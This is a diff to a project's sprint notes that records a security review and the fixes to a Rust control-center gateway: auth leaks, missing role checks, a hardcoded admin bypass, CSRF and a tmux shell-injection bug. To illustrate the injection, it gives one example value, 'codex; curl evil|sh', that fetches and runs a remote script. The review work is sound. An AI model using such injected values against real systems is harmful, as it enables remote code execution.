@@ -1,5 +1,74 @@
 # Sprint
 
+### ▶ UCC control-center security hardening (owner 2026-07-03: about to link the tailnet-only
+    control-center URL from busi's public "IT Consulting" site; asked for a security double-check
+    first — a static review of `crates/rozum-gateway/src/control.rs` found it is NOT safe to expose
+    more widely yet. Fixing before the busi link goes live on it.szykownia.pl.)
+
+- [x] **ucc-auth-status-leak** — DONE. `/control/status`, `/chat/messages`, `/chat/incidents`,
+  and the non-token-gated `/control/matrix/status|log|cell|live` are in the `public` router (no
+  `require_auth`) and return live coder-job workdirs + full task prompts, live terminal session ids,
+  chat-agent lists, meeting room names, and full agent chat transcripts to ANY client that reaches
+  the URL — no login. The `/control/public/matrix*` + `/view/{token}` routes already do this
+  correctly (admin-issued, revocable view tokens) — the plain `/control/matrix/*` routes bypass that
+  gate entirely with the same data. Fix: move all of these behind a new `require_perm("read")`
+  middleware (mirrors `require_admin`) inside the authenticated router.
+  - Where: `crates/rozum-gateway/src/control.rs` router setup (~line 20-90).
+  - Result: added a `reads` sub-router (`/control/status`, `/chat/messages`, `/chat/incidents`,
+    `/control/matrix/status|log|cell|live`) gated by new `require_perm_read` middleware, merged into
+    `protected` (behind `require_auth`). Live-verified: no cookie → 401 on all six; `/control/public/matrix`
+    (token-gated) and `/control/auth/status` unaffected (still public).
+- [x] **ucc-session-launch-injection** — DONE. `session_launch_route` (control.rs:863) builds
+  `format!("{} launch --model {} {}", exe, model, agent)` and hands it to `tmux new-session` as a
+  single shell-command string — `model`/`agent` come straight from the JSON request body, only
+  `.trim()`'d, so a value like `codex; curl evil|sh` is shell-interpreted by tmux. (`coder_launch_route`/
+  `spawn_coder` already use `Command::args` — argv, no shell — so they were NOT vulnerable; this was
+  isolated to the tmux shell-command string.)
+  - Where: `crates/rozum-gateway/src/control.rs:841-882`.
+  - Result: new `shell_safe(s)` helper (alnum + `-_./:@+` only) rejects `agent`/`model` before
+    `inner` is built → 400 instead of reaching `tmux new-session`. Unit tests
+    `shell_safe_accepts_realistic_model_and_agent_names` / `shell_safe_rejects_shell_metacharacters`.
+- [x] **ucc-rbac-enforce** — DONE. Only `/control/admin/*` checked `require_admin`; every other
+  `protected` route only checked "has a valid session" — a `readonly`-role user could launch
+  sessions/coders and attach the live terminal.
+  - Where: `crates/rozum-gateway/src/control.rs` router setup + new `require_perm_*` fns near
+    `require_admin`.
+  - Result: split `protected` into `chat`/`agents`/`matrix`/`projects` sub-routers, each with its own
+    `require_perm_<x>` inner layer (mirrors the existing `admin` sub-router), matching
+    `default_roles()` (`operator` holds read+chat+agents+matrix+projects; `readonly` now correctly
+    can't act on any of them — session/coder/matrix launch, chat post, project add all 403 for it).
+- [x] **ucc-busi-sso-scope** — DONE. `user_has_perm` (control.rs:1763) hardcoded
+  `if user_id == "busi-sso" { return true; }` — unconditional admin for ANY device paired to the
+  separate busi app, bypassing the role system entirely.
+  - Where: `crates/rozum-gateway/src/control.rs:1762-1772`, `auth_status_route`.
+  - Result: `busi-sso` now maps to the same permission set as the built-in `operator` role
+    (read/chat/agents/matrix/projects), NOT admin; `auth_status_route`'s reported permissions updated
+    to match. Unit test `busi_sso_gets_operator_perms_not_admin`.
+- [x] **ucc-csrf-hardening** — DONE. Cookie was `SameSite=None` with no CSRF token;
+  `coder_stop_route`/`session_stop_route` accept a raw `body: String` regardless of Content-Type — a
+  CORS "simple request" a cross-site page could POST with credentials to stop the owner's sessions.
+  - Where: `crates/rozum-gateway/src/control.rs:2109-2111` (`set_cookie`).
+  - Result: `SameSite=None` → `SameSite=Lax` (SPA+API are same-origin per `serve`'s own doc comment,
+    so Lax loses nothing) — blocks the cookie from riding along on a cross-site POST/fetch.
+- [x] **ucc-origin-port-stale** — bonus fix found while verifying the above (not in the original
+  review): `rp_origin()` defaulted to `https://busi.tail1174e2.ts.net:8447`, a leftover from the old
+  two-port (SPA+API split) layout in `docs/specs/unified-control-center.md`; the current deployment
+  (`deploy-ucc-web.sh`) consolidates both behind `:8448`, and `com.rozum.ucc-control.plist` sets no
+  `ROZUM_UCC_ORIGIN` override — so every WebAuthn ceremony's origin check was failing against the
+  live `:8448` origin. Fixed the default to `:8448`; also fixed the same stale `:8447` link in
+  `clients/meeting/meeting.ssc`'s 🎛 control-center toolbar link.
+- [ ] **ucc-tofu-bootstrap-note** — LOW/deferred. First WebAuthn registration is open to anyone
+  while the user list is empty (no allowlist for user #1) — only matters at first deploy or after a
+  full credential wipe, and the tailnet-only reachability already narrows this a lot. Documented, not
+  fixed; revisit only if the box is ever reprovisioned with the service reachable before the owner's
+  first login.
+
+`cargo build --workspace` + `cargo test -p rozum-gateway` (94 passed) green; live-smoke-tested the
+router changes on a throwaway port/HOME (401s where expected, public routes unaffected). NEXT: go
+back to `busi` and run `make deploy-it` to push the "IT Consulting" → rozum control-center link
+(already committed on busi `main` at `845540cf`) live to it.szykownia.pl — the thing this whole
+security pass was gating.
+
 ### ▶ runtime correctness + matrix quality (operator 2026-07-02)
 
 - [x] **smmr-D-coresident-gate** — DONE (2026-07-02, master `208fa73`). `eager_coresident_footprint()`
